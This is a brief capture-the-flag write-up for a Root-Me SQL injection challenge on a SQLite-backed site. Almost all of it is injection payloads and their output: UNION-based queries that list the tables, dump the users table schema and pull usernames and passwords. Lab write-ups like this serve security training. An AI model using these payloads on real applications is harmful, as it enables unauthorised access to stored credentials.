# SQL injection: string

[root-me challenge: SQL-injection-String](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-String): Retrieve the administrator password.

----

```text
' UNION SELECT 1,2,3 --
```

```text
SQLite3::query()
```

Using [PayloadAllTheThings: SQLiteInjection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md):

```text
7 result(s) for "' UNION SELECT NULL,tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' --"

 (news)
 (users)
```

```text
6 result(s) for "' UNION SELECT NULL,sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users' --"

 (CREATE TABLE users(username TEXT, password TEXT, Year INTEGER))
```

And:

```text
8 result(s) for "' UNION SELECT username,password FROM users --"
```

